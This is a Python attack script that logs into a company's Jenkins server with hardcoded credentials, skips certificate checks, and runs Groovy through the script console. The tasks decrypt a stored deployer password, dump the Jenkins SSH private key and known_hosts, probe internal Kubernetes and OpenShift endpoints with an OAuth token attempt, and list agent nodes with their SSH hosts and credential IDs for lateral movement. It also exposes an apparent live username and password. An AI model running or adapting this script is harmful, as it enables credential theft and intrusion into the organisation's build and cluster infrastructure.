import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK_M = r'''println "DEPLOYER_PASSWORD=" + hudson.util.Secret.fromString('{AQAAABAAAAAQuKnIu3k7NxL5rmREoi/L0Uv3HEllPiDpc4R2D5YQmHI=}').getPlainText()
'''

TASK_N = r'''def r = ["bash","-c","""
echo '===== .ssh dir ====='
ls -la /var/jenkins_home/.ssh/ 2>/dev/null
echo '===== id_rsa (private) ====='
cat /var/jenkins_home/.ssh/id_rsa 2>/dev/null
echo '===== known_hosts ====='
cat /var/jenkins_home/.ssh/known_hosts 2>/dev/null | awk '{print \$1}' | sort -u | head -20
echo '===== ssh config ====='
cat /var/jenkins_home/.ssh/config 2>/dev/null
"""].execute().text
println r
'''

TASK_O = r'''def r = ["bash","-c","""
echo '===== k3s 302 Location header ====='
curl -kI --max-time 8 https://api-admin.dev.claroshop.com/ 2>&1 | grep -iE 'HTTP/|location|server' | head -5
curl -kI --max-time 8 https://api-admin.dev.claroshop.com/api/v1/namespaces 2>&1 | grep -iE 'HTTP/|location|server' | head -5
echo '===== OCP oauth token attempt (.net:8443, 6s timeout) ====='
curl -sk --max-time 6 -u 'cs-jenkins-deployer:REDACTED' 'https://console.dev.amxnova.net:8443/oauth/authorize?response_type=token&client_id=openshift-challenging-client' -o /dev/null -w 'HTTP=%{http_code}\n' 2>&1 | tail -1
echo '===== OCP via .com IP SNI (6s) ====='
curl -sk --max-time 6 --resolve console.dev.amxnova.net:443:172.27.141.24 'https://console.dev.amxnova.net/api/v1' -o /dev/null -w 'HTTP=%{http_code}\n' 2>&1 | tail -1
"""].execute().text
println r
'''

TASK_P = r'''println '===== JENKINS NODES/AGENTS ====='
Jenkins.instance.nodes.each { n ->
    println "NODE: ${n.nodeName} | ${n.class.simpleName} | launcher=${n.launcher?.class?.simpleName}"
    try { println "  host=${n.launcher.host} user=${n.launcher.username} port=${n.launcher.port}" } catch(e) {}
    try { println "  credentialsId=${n.launcher.credentialsId}" } catch(e) {}
    println "  labels=${n.labelString} | online=${n.computer?.isOnline()}"
}
println '===== JNLP agent protocols / remoting ====='
println "agentPort=${Jenkins.instance.tcpSlaveAgentListener?.port}"
'''

TASKS = [
    ("TASK M: DECRYPT cs-jenkins-deployer password", TASK_M),
    ("TASK N: Jenkins .ssh keys + known_hosts", TASK_N),
    ("TASK O: k3s redirect target + OCP oauth attempt", TASK_O),
    ("TASK P: Jenkins nodes/agents (SSH launchers to other hosts)", TASK_P),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
